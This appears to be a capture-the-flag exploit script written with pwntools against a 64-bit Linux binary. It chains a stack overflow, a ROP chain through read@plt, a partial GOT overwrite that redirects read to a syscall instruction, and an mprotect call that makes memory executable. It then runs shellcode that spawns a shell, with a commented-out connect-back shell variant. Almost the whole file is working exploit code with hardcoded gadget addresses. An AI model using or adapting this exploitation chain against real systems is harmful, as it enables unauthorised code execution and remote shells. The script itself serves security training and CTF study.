#!/usr/bin/env python

import time
from pwn import *
import sys

# general idea:
# 0.) use read@plt call to overwrite stack buffer and get rip control + rop
# 1.) use read@plt call to place shellcode after got.plt
# 2.) use read@plt call to overwrite lowest byte of read@plt to make it point directly to syscall instruction
#     at the same time, only send 10 bytes of data so the return value (rax) gets set to 10 
#     which is also the syscall number of mprotect
# 3.) call mprotect to set got.plt rwx. the problem is that we don't have a gadget to set rdx
#     (which are the protection flags, those need to be set to 0x07 (rwx))
#     luckily we can use a rather complicated one, see the description of the mprotect call below
# 4.) jump to shellcode.

if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])

# read: 
# rdi -> fd
# rsi -> buffer
# rdx -> size

############ buffer read 1
buf = ""
buf += 'b'*24
# call read to put shellcode after plt
buf += p64(0x00000000004005c1) # pop rsi, r15, ret
buf += p64(0x0000000000601028) # rsi value
buf += p64(0xdeadbeefdeadbeef) # r15 value
buf += p64(0x400400) # read@plt

# call read to overwrite read low byte to point to syscall
# and set rax to 0x0a (mprotect syscall)
buf += p64(0x00000000004005c3) # pop rdi; ret
buf += p64(0x00) # set rdi -> 0
buf += p64(0x00000000004005c1) # pop rsi, r15, ret
buf += p64(0x000000000060100f) # rsi value -> overwrite 10 bytes from here, last is low byte of read@plt
buf += p64(0xdeadbeefdeadbeef) # r15 value
buf += p64(0x400400) # read@plt

# call mprotect

# set rdx
buf += p64(0x00000000004005bb) # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
buf += p64(0x0000000000000000) # rbp value -> needs to be same as rbx so no jmp
buf += p64(0x0000000000601018) # r12 value -> call [r12] -> 0x601018 (read@plt) 
buf += p64(0x0000000000000007) # r13 value -> mprot -> rdx
buf += p64(0x0000000000001000) # r14 value -> len of memory region -> rsi
buf += p64(0x0000000000601000) # r15 value -> start of memory region -> rdi
# 4005a0:       4c 89 ea                mov    rdx,r13
# 4005a3:       4c 89 f6                mov    rsi,r14
# 4005a6:       44 89 ff                mov    edi,r15d
# 4005a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
# 4005ad:       48 83 c3 01             add    rbx,0x1
# 4005b1:       48 39 eb                cmp    rbx,rbp
# 4005b4:       75 ea                   jne    4005a0 <__libc_start_main@plt+0x190>
# 4005b6:       48 83 c4 08             add    rsp,0x8
# 4005ba:       5b                      pop    rbx
# 4005bb:       5d                      pop    rbp
# 4005bc:       41 5c                   pop    r12
# 4005be:       41 5d                   pop    r13
# 4005c0:       41 5e                   pop    r14
# 4005c2:       41 5f                   pop    r15
# 4005c4:       c3                      ret    
buf += p64(0x00000000004005a0) # gadget described above

# final shellcode return address, this is not the ret in 0x4005c4
# but rather already somewhere in the middle of read
buf += p64(0x0000000000601028) # ret -> shellcode

buf += "a"*(0x400-len(buf)) # fill buffer read 1

############ buffer read 2
#shellcode = shellcraft.amd64.linux.connect(listen_ip, 1337) + shellcraft.amd64.linux.dupsh()
shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode, arch="amd64")
shellcode = shellcode + "c"*(0x400-len(shellcode)) # fill buffer read 2

############ buffer read 3
buf_overwrite = "a"*9 + "\x9b" # the last byte we overwrite of the read() syscall to point to syscall instruction

r.send(buf + shellcode + buf_overwrite)
r.interactive()
r.close()
